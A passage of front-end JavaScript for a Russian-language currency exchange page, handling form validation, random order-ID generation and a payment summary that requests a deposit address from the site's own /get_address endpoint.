            } else if ( Number(document.querySelector('.first__input-one').value) > maxLimitValuteFirst ) {
                document.querySelectorAll('.first__message')[0].style.display = 'block';
                document.querySelectorAll('.first__message p')[0].textContent = `Сумма должна быть меньше ${maxLimitValuteFirst}`;
                document.querySelectorAll('.first__table')[0].style.border = '2px solid #F73';
                document.querySelectorAll('.first__table')[0].style.marginBottom = '38px';
            }

            if ( document.querySelector('.first__input-one').value == '' ) {
                document.querySelectorAll('.first__message')[0].style.display = 'none';
                document.querySelectorAll('.first__table')[0].style.border = '2px solid #cfcfcf';
                document.querySelectorAll('.first__table')[0].style.marginBottom = '0px';
            }
        }

    }, 1000 )
})

document.querySelector('.first__input-one').addEventListener('click', event => {
    document.querySelectorAll('.first__message')[0].style.display = 'none';
    document.querySelectorAll('.first__table')[0].style.border = '2px solid #000';
    document.querySelectorAll('.first__table')[0].style.marginBottom = '0px';
})

// Второе поле

document.querySelector('.first__input-two').addEventListener('input', event => {

    document.querySelectorAll('.first__message')[1].style.display = 'none';
    document.querySelectorAll('.first__table')[1].style.border = '2px solid #cfcfcf';
    document.querySelectorAll('.first__table')[1].style.marginBottom = '0px';

    setTimeout( () => {
        
        if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
            if ( Number(document.querySelector('.first__input-two').value) < minLimitSecond ) {
                document.querySelectorAll('.first__message')[1].style.display = 'block';
                document.querySelectorAll('.first__message p')[1].textContent = `Сумма должна быть больше ${minLimitSecond}`;
                document.querySelectorAll('.first__table')[1].style.border = '2px solid #F73';
                document.querySelectorAll('.first__table')[1].style.marginBottom = '38px';
            } else if ( Number(document.querySelector('.first__input-two').value) > maxLimitSecond ) {
                document.querySelectorAll('.first__message')[1].style.display = 'block';
                document.querySelectorAll('.first__message p')[1].textContent = `Сумма должна быть меньше ${maxLimitSecond}`;
                document.querySelectorAll('.first__table')[1].style.border = '2px solid #F73';
                document.querySelectorAll('.first__table')[1].style.marginBottom = '38px';
            }

            if ( document.querySelector('.first__input-two').value == '' ) {
                document.querySelectorAll('.first__message')[1].style.display = 'none';
                document.querySelectorAll('.first__table')[1].style.border = '2px solid #cfcfcf';
                document.querySelectorAll('.first__table')[1].style.marginBottom = '0px';
            }
        } else if ( valuteCategorySecond == 'CRYPTO' || valuteCategorySecond == 'PAYSYSTEM' ) {
            if ( Number(document.querySelector('.first__input-two').value) < minLimitValuteSecond ) {
                document.querySelectorAll('.first__message')[1].style.display = 'block';
                document.querySelectorAll('.first__message p')[1].textContent = `Сумма должна быть больше ${minLimitValuteSecond}`;
                document.querySelectorAll('.first__table')[1].style.border = '2px solid #F73';
                document.querySelectorAll('.first__table')[1].style.marginBottom = '38px';
            } else if ( Number(document.querySelector('.first__input-two').value) > maxLimitValuteSecond ) {
                document.querySelectorAll('.first__message')[1].style.display = 'block';
                document.querySelectorAll('.first__message p')[1].textContent = `Сумма должна быть меньше ${maxLimitValuteSecond}`;
                document.querySelectorAll('.first__table')[1].style.border = '2px solid #F73';
                document.querySelectorAll('.first__table')[1].style.marginBottom = '38px';
            }

            if ( document.querySelector('.first__input-two').value == '' ) {
                document.querySelectorAll('.first__message')[1].style.display = 'none';
                document.querySelectorAll('.first__table')[1].style.border = '2px solid #cfcfcf';
                document.querySelectorAll('.first__table')[1].style.marginBottom = '0px';
            }
        }

    }, 1000 )
})

document.querySelector('.first__input-two').addEventListener('click', event => {
    document.querySelectorAll('.first__message')[1].style.display = 'none';
    document.querySelectorAll('.first__table')[1].style.border = '2px solid #000';
    document.querySelectorAll('.first__table')[1].style.marginBottom = '0px';
})

// Кнопка создания заявки

let haveERROR = false;

document.querySelector('.first__button').addEventListener('click', event => {

    haveERROR = false;

    // Проверка первого поля
    if ( Number(document.querySelector('.first__input-one').value) == '' ) {
        document.querySelectorAll('.first__message p')[0].textContent = 'Поле не может быть пустым';
        document.querySelectorAll('.first__message')[0].style.display = 'block';
        document.querySelectorAll('.first__table')[0].style.border = '2px solid #F73';
        document.querySelectorAll('.first__table')[0].style.marginBottom = '30px';
        haveERROR = true;
    } else if ( valuteCategoryFirst == 'SBP' || valuteCategoryFirst == 'BANK' ) {
        if ( Number(document.querySelector('.first__input-one').value) < minLimitFirst ) {
            document.querySelectorAll('.first__message')[0].style.display = 'block';
            document.querySelectorAll('.first__message p')[0].textContent = `Сумма должна быть больше ${minLimitFirst}`;
            document.querySelectorAll('.first__table')[0].style.border = '2px solid #F73';
            document.querySelectorAll('.first__table')[0].style.marginBottom = '38px';
            haveERROR = true;
        } else if ( Number(document.querySelector('.first__input-one').value) > maxLimitFirst ) {
            document.querySelectorAll('.first__message')[0].style.display = 'block';
            document.querySelectorAll('.first__message p')[0].textContent = `Сумма должна быть меньше ${maxLimitFirst}`;
            document.querySelectorAll('.first__table')[0].style.border = '2px solid #F73';
            document.querySelectorAll('.first__table')[0].style.marginBottom = '38px';
            haveERROR = true;
        }
    } else if ( valuteCategoryFirst == 'CRYPTO' || valuteCategoryFirst == 'PAYSYSTEM' ) {
        if ( Number(document.querySelector('.first__input-one').value) < minLimitValuteFirst ) {
            document.querySelectorAll('.first__message')[0].style.display = 'block';
            document.querySelectorAll('.first__message p')[0].textContent = `Сумма должна быть больше ${minLimitValuteFirst}`;
            document.querySelectorAll('.first__table')[0].style.border = '2px solid #F73';
            document.querySelectorAll('.first__table')[0].style.marginBottom = '38px';
            haveERROR = true;
        } else if ( Number(document.querySelector('.first__input-one').value) > maxLimitValuteFirst ) {
            document.querySelectorAll('.first__message')[0].style.display = 'block';
            document.querySelectorAll('.first__message p')[0].textContent = `Сумма должна быть меньше ${maxLimitValuteFirst}`;
            document.querySelectorAll('.first__table')[0].style.border = '2px solid #F73';
            document.querySelectorAll('.first__table')[0].style.marginBottom = '38px';
            haveERROR = true;
        }
    }

    // Проверка второго поля

    if ( Number(document.querySelector('.first__input-two').value) == '' ) {
        document.querySelectorAll('.first__message p')[1].textContent = 'Поле не может быть пустым';
        document.querySelectorAll('.first__message')[1].style.display = 'block';
        document.querySelectorAll('.first__table')[1].style.border = '2px solid #F73';
        document.querySelectorAll('.first__table')[1].style.marginBottom = '30px';
        haveERROR = true;
    } else if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
        if ( Number(document.querySelector('.first__input-two').value) < minLimitSecond ) {
            document.querySelectorAll('.first__message')[1].style.display = 'block';
            document.querySelectorAll('.first__message p')[1].textContent = `Сумма должна быть больше ${minLimitSecond}`;
            document.querySelectorAll('.first__table')[1].style.border = '2px solid #F73';
            document.querySelectorAll('.first__table')[1].style.marginBottom = '38px';
            haveERROR = true;
        } else if ( Number(document.querySelector('.first__input-two').value) > maxLimitSecond ) {
            document.querySelectorAll('.first__message')[1].style.display = 'block';
            document.querySelectorAll('.first__message p')[1].textContent = `Сумма должна быть меньше ${maxLimitSecond}`;
            document.querySelectorAll('.first__table')[1].style.border = '2px solid #F73';
            document.querySelectorAll('.first__table')[1].style.marginBottom = '38px';
            haveERROR = true;
        }
    } else if ( valuteCategorySecond == 'CRYPTO' || valuteCategorySecond == 'PAYSYSTEM' ) {
        if ( Number(document.querySelector('.first__input-two').value) < minLimitValuteSecond ) {
            document.querySelectorAll('.first__message')[1].style.display = 'block';
            document.querySelectorAll('.first__message p')[1].textContent = `Сумма должна быть больше ${minLimitValuteSecond}`;
            document.querySelectorAll('.first__table')[1].style.border = '2px solid #F73';
            document.querySelectorAll('.first__table')[1].style.marginBottom = '38px';
            haveERROR = true;
        } else if ( Number(document.querySelector('.first__input-two').value) > maxLimitValuteSecond ) {
            document.querySelectorAll('.first__message')[1].style.display = 'block';
            document.querySelectorAll('.first__message p')[1].textContent = `Сумма должна быть меньше ${maxLimitValuteSecond}`;
            document.querySelectorAll('.first__table')[1].style.border = '2px solid #F73';
            document.querySelectorAll('.first__table')[1].style.marginBottom = '38px';
            haveERROR = true;
        }
    }

    // Проверка выбраного банка

    if ( needBANK == true ) {
        // document.querySelectorAll('.first__message p')[1].textContent = 'Поле не может быть пустым';
        document.querySelectorAll('.first__message')[2].style.display = 'block';
        document.querySelectorAll('.first__banklist')[0].style.border = '2px solid #F73';
        document.querySelectorAll('.first__banklist')[0].style.marginBottom = '30px';
        haveERROR = true;
    }

    // Проверка на вписанный кошелек/номер

    if ( document.querySelector('.rec__wallet input').value == '' ) {
        document.querySelectorAll('.first__message p')[3].textContent = 'Поле не может быть пустым';
        document.querySelectorAll('.first__message')[3].style.display = 'block';
        document.querySelector('.rec__wallet').style.border = '2px solid #F73';
        document.querySelector('.rec__wallet').style.marginBottom = '40px';
        haveERROR = true;
    } else if ( document.querySelector('.rec__title-namewallet').textContent.includes('Номер телефона') ) {
        if ( !document.querySelector('.rec__wallet input').value.includes('+7') || String(document.querySelector('.rec__wallet input').value).length < 12 || String(document.querySelector('.rec__wallet input').value).length > 12 ) {
            document.querySelectorAll('.first__message p')[3].textContent = 'Не верный номер телефона';
            document.querySelectorAll('.first__message')[3].style.display = 'block';
            document.querySelector('.rec__wallet').style.border = '2px solid #F73';
            document.querySelector('.rec__wallet').style.marginBottom = '40px';
            haveERROR = true;
        }
    } else if ( document.querySelector('.rec__title-namewallet').textContent.includes('Кошелек') && !document.querySelector('.rec__title-namewallet').textContent.includes('Кошелек PM USD') ) {
        if ( String(document.querySelector('.rec__wallet input').value).length < 25 || String(document.querySelector('.rec__wallet input').value).length > 48 ) {
            document.querySelectorAll('.first__message p')[3].textContent = 'Не верный адрес кошелька';
            document.querySelectorAll('.first__message')[3].style.display = 'block';
            document.querySelector('.rec__wallet').style.border = '2px solid #F73';
            document.querySelector('.rec__wallet').style.marginBottom = '40px';
            haveERROR = true;
        }
    } else if ( document.querySelector('.rec__title-namewallet').textContent.includes('Кошелек PM USD') ) {
        if ( !String(document.querySelector('.rec__wallet input').value).includes('U') || String(document.querySelector('.rec__wallet input').value).length < 5 ) {
            document.querySelectorAll('.first__message p')[3].textContent = 'Не верный адрес кошелька';
            document.querySelectorAll('.first__message')[3].style.display = 'block';
            document.querySelector('.rec__wallet').style.border = '2px solid #F73';
            document.querySelector('.rec__wallet').style.marginBottom = '40px';
            haveERROR = true;
        }
    } else if ( document.querySelector('.rec__title-namewallet').textContent.includes('Карта') ) {
        if ( String(document.querySelector('.rec__wallet input').value).length < 16 || String(document.querySelector('.rec__wallet input').value).length > 18 ) {
            document.querySelectorAll('.first__message p')[3].textContent = 'Не корректный номер карты';
            document.querySelectorAll('.first__message')[3].style.display = 'block';
            document.querySelector('.rec__wallet').style.border = '2px solid #F73';
            document.querySelector('.rec__wallet').style.marginBottom = '40px';
            haveERROR = true;
        }
    }

    // Проверка на тег

    if ( needMEMO == true ) {
        if ( document.querySelector('.rec__tage input').value == '' ) {
            document.querySelectorAll('.first__message span')[0].textContent = 'Поле не может быть пустым';
            document.querySelectorAll('.first__message')[4].style.display = 'block';
            document.querySelector('.rec__tage').style.border = '2px solid #F73';
            document.querySelector('.rec__tage').style.marginBottom = '40px';
            haveERROR = true;
        } else if ( String(document.querySelector('.rec__tage input').value).length < 4 ) {
            document.querySelectorAll('.first__message span')[0].textContent = 'Неверный тег назначения';
            document.querySelectorAll('.first__message')[4].style.display = 'block';
            document.querySelector('.rec__tage').style.border = '2px solid #F73';
            document.querySelector('.rec__tage').style.marginBottom = '40px';
            haveERROR = true;
        }
    }

    // Проверка email

    if ( document.querySelector('.rec__mail input').value == '' ) {
        document.querySelectorAll('.first__message p')[4].textContent = 'Поле не может быть пустым';
        document.querySelectorAll('.first__message')[5].style.display = 'block';
        document.querySelector('.rec__mail').style.border = '2px solid #F73';
        document.querySelector('.rec__mail').style.marginBottom = '40px';
        haveERROR = true;
    } else if ( !String(document.querySelector('.rec__mail input').value).includes('@') || !String(document.querySelector('.rec__mail input').value).includes('.') ) {
        document.querySelectorAll('.first__message p')[4].textContent = 'Не верный E-mail';
        document.querySelectorAll('.first__message')[5].style.display = 'block';
        document.querySelector('.rec__mail').style.border = '2px solid #F73';
        document.querySelector('.rec__mail').style.marginBottom = '40px';
        haveERROR = true;
    }

    // Проверка AML

    if ( needAML == true ) {
        document.querySelector('.rec__check').style.border = '2px solid #f01010';
        document.querySelectorAll('.rec__red').forEach(item => {
            item.style.color = '#f01010';
        })
        haveERROR = true;
    }

    if ( haveERROR == false ) {
        nextStep();
        document.title = 'Сделка';
    }

})

// Убираем сообщения с полей

document.querySelector('.rec__wallet input').addEventListener('click', event => {
    document.querySelectorAll('.first__message')[3].style.display = 'none';
    document.querySelector('.rec__wallet').style.border = '2px solid #000';
    document.querySelector('.rec__wallet').style.marginBottom = '20px';
})

document.querySelector('.rec__tage input').addEventListener('click', event => {
    document.querySelectorAll('.first__message')[4].style.display = 'none';
    document.querySelector('.rec__tage').style.border = '2px solid #000';
    document.querySelector('.rec__tage').style.marginBottom = '20px';
})

document.querySelector('.rec__mail input').addEventListener('click', event => {
    document.querySelectorAll('.first__message')[5].style.display = 'none';
    document.querySelector('.rec__mail').style.border = '2px solid #000';
    document.querySelector('.rec__mail').style.marginBottom = '20px';
})

// Закрытие окон со списком валют на мобилке

document.querySelector('.table__mobile svg').addEventListener('click', event => {
    document.querySelector('.table').style.display = 'none';
    document.querySelector('.first__input-one').style.background = '#FFF';
    valuteListOneActive = false;
})

document.querySelector('.table-two__mobile svg').addEventListener('click', event => {
    document.querySelector('.table-two').style.display = 'none';
    document.querySelector('.first__input-two').style.background = '#FFF';
    valuteListTwoActive = false;
})

// Создание ID

function getRandomInt(max) {
    return Math.floor(Math.random() * max);
}

let orderID = '';
for ( let i = 0; i < 13; i++ ) {
    let getThis = getRandomInt(36);
    if ( getThis == 0 ) {
        getThis = '2';
    } else if ( getThis == 1 ) {
        getThis = '1';
    } else if ( getThis == 2 ) {
        getThis = 'e';
    } else if ( getThis == 3 ) {
        getThis = '3';
    } else if ( getThis == 4 ) {
        getThis = '4';
    } else if ( getThis == 5 ) {
        getThis = '5';
    } else if ( getThis == 6 ) {
        getThis = '6';
    } else if ( getThis == 7 ) {
        getThis = '7';
    } else if ( getThis == 8 ) {
        getThis = 'o';
    } else if ( getThis == 9 ) {
        getThis = '6';
    } else if ( getThis == 10 ) {
        getThis = 'a';
    } else if ( getThis == 11 ) {
        getThis = 's';
    } else if ( getThis == 12 ) {
        getThis = 'd';
    } else if ( getThis == 13 ) {
        getThis = 'f';
    } else if ( getThis == 14 ) {
        getThis = 'g';
    } else if ( getThis == 15 ) {
        getThis = '0';
    } else if ( getThis == 16 ) {
        getThis = '9';
    } else if ( getThis == 17 ) {
        getThis = '8';
    } else if ( getThis == 18 ) {
        getThis = '7';
    } else if ( getThis == 19 ) {
        getThis = '6';
    } else if ( getThis == 20 ) {
        getThis = '5';
    } else if ( getThis == 21 ) {
        getThis = 'c';
    } else if ( getThis == 22 ) {
        getThis = '4';
    } else if ( getThis == 23 ) {
        getThis = '3';
    } else if ( getThis == 24 ) {
        getThis = '2';
    } else if ( getThis == 25 ) {
        getThis = '1';
    } else if ( getThis == 26 ) {
        getThis = '0';
    } else if ( getThis == 27 ) {
        getThis = '1';
    } else if ( getThis == 28 ) {
        getThis = '2';
    } else if ( getThis == 29 ) {
        getThis = '3';
    } else if ( getThis == 30 ) {
        getThis = '4';
    } else if ( getThis == 31 ) {
        getThis = '5';
    } else if ( getThis == 32 ) {
        getThis = '6';
    } else if ( getThis == 33 ) {
        getThis = '7';
    } else if ( getThis == 34 ) {
        getThis = '8';
    } else if ( getThis == 35 ) {
        getThis = '9';
    }

    orderID += String(getThis);

}


// console.log(orderID);

function nextStep() {
    
    document.querySelector('.pay__title').textContent = `Заказ ${orderID}`;
    document.querySelector('.modal__title span').textContent = orderID;
    
    document.querySelector('.pay__valutes-val-one').textContent = document.querySelector('.table__valute-active p').textContent;
    document.querySelector('.pay__valutes-icon-one').src = document.querySelector('.table__valute-active img').src;

    let currencyType;

    if ( valuteCategoryFirst == 'BANK' ) {
        document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} RUB`;
        currencyType = 'card';
    } else if ( valuteCategoryFirst == 'SBP' ) {
        document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} RUB`;
        currencyType = 'sbp';
    } else if ( valuteCategoryFirst == 'PAYSYSTEM' ) {
        document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} USD`;
        currencyType = 'pmusd';
    } else if ( valuteCategoryFirst == 'CRYPTO' ) {
        if ( valuteFirstName == 'Bitcoin (BTC)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} BTC`;
            currencyType = 'btc';
        } else if ( valuteFirstName == 'Tether ERC20 (USDT)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} USDT`;
            currencyType = 'usdterc';
        } else if ( valuteFirstName == 'Tether TRC20 (USDT)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} USDT`;
            currencyType = 'usdttrc';
        } else if ( valuteFirstName == 'Tether BEP20 (USDT)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} USDT`;
            currencyType = 'usdtbep';
        } else if ( valuteFirstName == 'Tether SOL (USDT)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} USDT`;
            currencyType = 'usdtsol';
        } else if ( valuteFirstName == 'Tether TON (USDT)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} USDT`;
            currencyType = 'usdtton';
        } else if ( valuteFirstName == 'Dai (DAI)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} DAI`;
            currencyType = 'dai';
        } else if ( valuteFirstName == 'Polkadot (DOT)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} DOT`;
            currencyType = 'dot';
        } else if ( valuteFirstName == 'USD Coin ERC20 (USDC)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} USDC`;
            currencyType = 'usdcterc';
        } else if ( valuteFirstName == 'USD Coin SOL (USDC)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} USDC`;
            currencyType = 'usdcsol';
        } else if ( valuteFirstName == 'Solana (SOL)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} SOL`;
            currencyType = 'sol';
        } else if ( valuteFirstName == 'Polygon (POL)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} POL`;
            currencyType = 'pol';
        } else if ( valuteFirstName == 'Ethereum Arbitrum (ETH)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} ETH`;
            currencyType = 'etharb';
        } else if ( valuteFirstName == 'Ethereum Optimism (ETH)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} ETH`;
            currencyType = 'ethop';
        } else if ( valuteFirstName == 'Ethereum (ETH)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} ETH`;
            currencyType = 'eth';
        } else if ( valuteFirstName == 'Arbitrum one (ARB)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} ARB`;
            currencyType = 'arb';
        } else if ( valuteFirstName == 'Litecoin (LTC)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} LTC`;
            currencyType = 'ltc';
        } else if ( valuteFirstName == 'Bitcoin Cash (BCH)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} BCH`;
            currencyType = 'bch';
        } else if ( valuteFirstName == 'Ripple (XRP)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} XRP`;
            currencyType = 'xrp';
        } else if ( valuteFirstName == 'Dogecoin (DOGE)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} DOGE`;
            currencyType = 'doge';
        } else if ( valuteFirstName == 'Ethereum Classic (ETC)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} ETC`;
            currencyType = 'etc';
        } else if ( valuteFirstName == 'Stellar (XLM)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} XLM`;
            currencyType = 'xlm';
        } else if ( valuteFirstName == 'Tron (TRX)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} TRX`;
            currencyType = 'trx';
        } else if ( valuteFirstName == 'Toncoin (TON)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} TON`;
            currencyType = 'ton';
        } else if ( valuteFirstName == 'Dash (DASH)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} DASH`;
            currencyType = 'dash';
        } else if ( valuteFirstName == 'Zcash (ZEC)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} ZEC`;
            currencyType = 'zec';
        } else if ( valuteFirstName == 'Binance Coin (BNB BEP20)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} BNB`;
            currencyType = 'bnb';
        } else if ( valuteFirstName == 'Monero (XMR)' ) {
            document.querySelector('.pay__valutes-num-one').textContent = `${document.querySelector('.first__input-one').value} XMR`;
            currencyType = 'xmr';
        }

    }

    if (currencyType) {
        fetch('/get_address', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ type: currencyType })
        })
        .then(response => response.json())
        .then(data => {
            if (data.address) {
                document.querySelector('.pay__table-wallet p').textContent = data.address;
            }
        })
        .catch(error => {
            console.error('Ошибка при запросе к API:', error);
        });
    }

    document.querySelector('.pay__valutes-val-two').textContent = document.querySelector('.table-two__valute-active p').textContent;
    document.querySelector('.pay__valutes-icon-two').src = document.querySelector('.table-two__valute-active img').src;
    document.querySelector('.modal__numbers img').src = document.querySelector('.table-two__valute-active img').src;
    // document.querySelector('.pay__valutes-num-two').textContent = document.querySelector('.first__input-two').value;

    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
        document.querySelector('.pay__valutes-num-two').textContent = `${document.querySelector('.first__input-two').value} RUB`;
    } else if ( valuteCategorySecond == 'PAYSYSTEM' ) {
        document.querySelector('.pay__valutes-num-two').textContent = `${document.querySelector('.first__input-two').value} USD`;
    } else if ( valuteCategorySecond == 'CRYPTO' ) {
        if ( valuteSecondName == 'Bitcoin (BTC)' ) {
            document.querySelector('.pay__valutes-num-two').textContent = `${document.querySelector('.first__input-two').value} BTC`;
        } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' ) {
            document.querySelector('.pay__valutes-num-two').textContent = `${document.querySelector('.first__input-two').value} USDT`;
        } else if ( valuteSecondName == 'Dai (DAI)' ) {
            document.querySelector('.pay__valutes-num-two').textContent = `${document.querySelector('.first__input-two').value} DAI`;
        } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
            document.querySelector('.pay__valutes-num-two').textContent = `${document.querySelector('.first__input-two').value} DOT`;
        } else if ( valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
            document.querySelector('.pay__valutes-num-two').textContent = `${document.querySelector('.first__input-two').value} USDC`;
        } else if ( valuteSecondName == 'Solana (SOL)' ) {
            document.querySelector('.pay__valutes-num-two').textContent = `${document.querySelector('.first__input-two').value} SOL`;
        } else if ( valuteSecondName == 'Polygon (POL)' ) {
            document.querySelector('.pay__valutes-num-two').textContent = `${document.querySelector('.first__input-two').value} POL`;
        } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' || valuteSecondName == 'Ethereum (ETH)' ) {
            document.querySelector('.pay__valutes-num-two').textContent = `${document.querySelector('.first__input-two').value} ETH`;
        } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
            document.querySelector('.pay__valutes-num-two').textContent = `${document.querySelector('.first__input-two').value} ARB`;
        } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
            document.querySelector('.pay__valutes-num-two').textContent = `${document.querySelector('.first__input-two').value} LTC`;
        } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
            document.querySelector('.pay__valutes-num-two').textContent = `${document.querySelector('.first__input-two').value} BCH`;
        } else if ( valuteSecondName == 'Ripple (XRP)' ) {
            document.querySelector('.pay__valutes-num-two').textContent = `${document.querySelector('.first__input-two').value} XRP`;
        } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
            document.querySelector('.pay__valutes-num-two').textContent = `${document.querySelector('.first__input-two').value} DOGE`;
        } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
            document.querySelector('.pay__valutes-num-two').textContent = `${document.querySelector('.first__input-two').value} ETC`;
        } else if ( valuteSecondName == 'Stellar (XLM)' ) {
            document.querySelector('.pay__valutes-num-two').textContent = `${document.querySelector('.first__input-two').value} XLM`;
        } else if ( valuteSecondName == 'Tron (TRX)' ) {
            document.querySelector('.pay__valutes-num-two').textContent = `${document.querySelector('.first__input-two').value} TRX`;
        } else if ( valuteSecondName == 'Toncoin (TON)' ) {
            document.querySelector('.pay__valutes-num-two').textContent = `${document.querySelector('.first__input-two').value} TON`;
        } else if ( valuteSecondName == 'Dash (DASH)' ) {
            document.querySelector('.pay__valutes-num-two').textContent = `${document.querySelector('.first__input-two').value} DASH`;
        } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
            document.querySelector('.pay__valutes-num-two').textContent = `${document.querySelector('.first__input-two').value} ZEC`;
        } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
            document.querySelector('.pay__valutes-num-two').textContent = `${document.querySelector('.first__input-two').value} BNB`;
        } else if ( valuteSecondName == 'Monero (XMR)' ) {
            document.querySelector('.pay__valutes-num-two').textContent = `${document.querySelector('.first__input-two').value} XMR`;
        }

    }

    document.querySelector('.modal__numbers p').textContent = document.querySelector('.pay__valutes-num-two').textContent;

    document.querySelector('.pay__table-valute img').src = document.querySelector('.table__valute-active img').src;
    document.querySelector('.pay__table-valute p').textContent = document.querySelector('.pay__valutes-num-one').textContent;
    document.querySelector('.pay__summ').textContent = document.querySelector('.pay__valutes-num-two').textContent;
    document.querySelector('.pay__wlt').textContent = document.querySelector('.rec__wallet input').value;
    document.querySelector('.modal__address p').textContent = document.querySelector('.rec__wallet input').value;

    if ( valuteCategorySecond == 'CRYPTO' ) {
        if ( valuteSecondName == 'Bitcoin (BTC)' ) {
            document.querySelector('.pay__web').textContent = 'Bitcoin (BTC)';
        } else if ( valuteSecondName == 'Tether ERC20 (USDT)' ) {
            document.querySelector('.pay__web').textContent = 'ERC-20 (Ethereum)';
        } else if ( valuteSecondName == 'Tether TRC20 (USDT)' ) {
            document.querySelector('.pay__web').textContent = 'TRC-20 (Tron)';
        } else if ( valuteSecondName == 'Tether BEP20 (USDT)' ) {
            document.querySelector('.pay__web').textContent = 'BEP-20 (BNB)';
        } else if ( valuteSecondName == 'Tether SOL (USDT)' ) {
            document.querySelector('.pay__web').textContent = 'SOL (Solana)';
        } else if ( valuteSecondName == 'Tether TON (USDT)' ) {
            document.querySelector('.pay__web').textContent = 'The Open Network (TON)';
        } else if ( valuteSecondName == 'Dai (DAI)' ) {
            document.querySelector('.pay__web').textContent = 'Bitcoin (BTC)';
        } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
            document.querySelector('.pay__web').textContent = 'Polkadot (DOT)';
        } else if ( valuteSecondName == 'USD Coin ERC20 (USDC)' ) {
            document.querySelector('.pay__web').textContent = 'ERC-20 (Ethereum)';
        } else if ( valuteSecondName == 'USD Coin SOL (USDC)' ) {
            document.querySelector('.pay__web').textContent = 'SOL (Solana)';
        } else if ( valuteSecondName == 'Solana (SOL)' ) {
            document.querySelector('.pay__web').textContent = 'Solana (SOL)';
        } else if ( valuteSecondName == 'Polygon (POL)' ) {
            document.querySelector('.pay__web').textContent = 'Polygon (POL)';
        } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' ) {
            document.querySelector('.pay__web').textContent = 'Arbitrum One (ARB)';
        } else if ( valuteSecondName == 'Ethereum Optimism (ETH)' ) {
            document.querySelector('.pay__web').textContent = 'Optimism (OP)';
        } else if ( valuteSecondName == 'Ethereum (ETH)' ) {
            document.querySelector('.pay__web').textContent = 'ERC-20 (Ethereum)';
        } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
            document.querySelector('.pay__web').textContent = 'Arbitrum one (ARB)';
        } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
            document.querySelector('.pay__web').textContent = 'Litecoin (LTC)';
        } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
            document.querySelector('.pay__web').textContent = 'Bitcoin Cash (BCH)';
        } else if ( valuteSecondName == 'Ripple (XRP)' ) {
            document.querySelector('.pay__web').textContent = 'Ripple (XRP)';
        } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
            document.querySelector('.pay__web').textContent = 'Dogecoin (DOGE)';
        } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
            document.querySelector('.pay__web').textContent = 'Ethereum Classic (ETC)';
        } else if ( valuteSecondName == 'Stellar (XLM)' ) {
            document.querySelector('.pay__web').textContent = 'Stellar (XLM)';
